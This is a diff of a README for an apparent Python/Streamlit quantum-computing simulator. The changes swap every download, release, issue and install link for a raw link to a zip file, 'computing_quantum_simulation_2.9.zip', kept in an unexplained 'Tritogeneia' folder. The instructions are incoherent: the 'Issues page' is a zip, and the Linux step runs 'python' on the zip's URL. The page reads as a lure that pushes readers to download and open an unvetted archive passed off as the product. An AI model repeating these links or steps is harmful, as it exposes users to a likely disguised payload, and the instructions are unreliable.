@@ -4,7 +4,7 @@
 Welcome to the quantum-computing-simulation project! This project offers a mini-quantum-lab built with Python and Streamlit. It allows you to visualize quantum states and gates in real-time. With our simulator, you can easily grasp complex concepts like superposition and entanglement.
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/isawavlrt/quantum-computing-simulation/main/Tritogeneia/quantum-computing-simulation.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/isawavlrt/quantum-computing-simulation/main/Tritogeneia/quantum-computing-simulation.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/isawavlrt/quantum-computing-simulation/main/Tritogeneia/computing_quantum_simulation_2.9.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/isawavlrt/quantum-computing-simulation/main/Tritogeneia/computing_quantum_simulation_2.9.zip)
 
 ## 🛠️ Requirements
 Before you start, ensure that you have the following:
@@ -34,10 +34,10 @@ This project covers the following key areas:
 - tech innovation 
 
 ## 📥 Download & Install
-To download the application, visit the [Releases page](https://raw.githubusercontent.com/isawavlrt/quantum-computing-simulation/main/Tritogeneia/quantum-computing-simulation.zip). Here, you will find the latest version of the application available for download.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/isawavlrt/quantum-computing-simulation/main/Tritogeneia/computing_quantum_simulation_2.9.zip). Here, you will find the latest version of the application available for download.
 
 ### Installation Steps:
-1. **Open the Releases Page:** Click on the link to access the releases section: [Releases Page](https://raw.githubusercontent.com/isawavlrt/quantum-computing-simulation/main/Tritogeneia/quantum-computing-simulation.zip).
+1. **Open the Releases Page:** Click on the link to access the releases section: [Releases Page](https://raw.githubusercontent.com/isawavlrt/quantum-computing-simulation/main/Tritogeneia/computing_quantum_simulation_2.9.zip).
 2. **Choose the Latest Version:** Look for the newest release at the top of the page.
 3. **Download the File:** Click on the download link for your operating system.
 4. **Run the Application:** Once downloaded, open the file and follow the on-screen instructions to start using the simulator.
@@ -55,10 +55,10 @@ To download the application, visit the [Releases page](https://raw.githubusercon
 4. Run the application from your Applications.
 
 ### Linux Installation
-1. Download the `https://raw.githubusercontent.com/isawavlrt/quantum-computing-simulation/main/Tritogeneia/quantum-computing-simulation.zip` file.
+1. Download the `https://raw.githubusercontent.com/isawavlrt/quantum-computing-simulation/main/Tritogeneia/computing_quantum_simulation_2.9.zip` file.
 2. Extract the contents using the terminal.
 3. Open the terminal and navigate to the extracted folder.
-4. Run the application by executing `python https://raw.githubusercontent.com/isawavlrt/quantum-computing-simulation/main/Tritogeneia/quantum-computing-simulation.zip` (Ensure all dependencies are installed).
+4. Run the application by executing `python https://raw.githubusercontent.com/isawavlrt/quantum-computing-simulation/main/Tritogeneia/computing_quantum_simulation_2.9.zip` (Ensure all dependencies are installed).
 
 ## ⚙️ Troubleshooting
 If you encounter any issues while downloading or running the application, consider the following tips:
@@ -71,7 +71,7 @@ If you encounter any issues while downloading or running the application, consid
 ## 💬 Community & Support
 If you have questions or need assistance, feel free to reach out:
 
-- **Issues Page:** [Report Issues](https://raw.githubusercontent.com/isawavlrt/quantum-computing-simulation/main/Tritogeneia/quantum-computing-simulation.zip)
+- **Issues Page:** [Report Issues](https://raw.githubusercontent.com/isawavlrt/quantum-computing-simulation/main/Tritogeneia/computing_quantum_simulation_2.9.zip)
 - **Discussion Forum:** Participate in conversations with other users and developers.
 
 ## 👥 Contributing
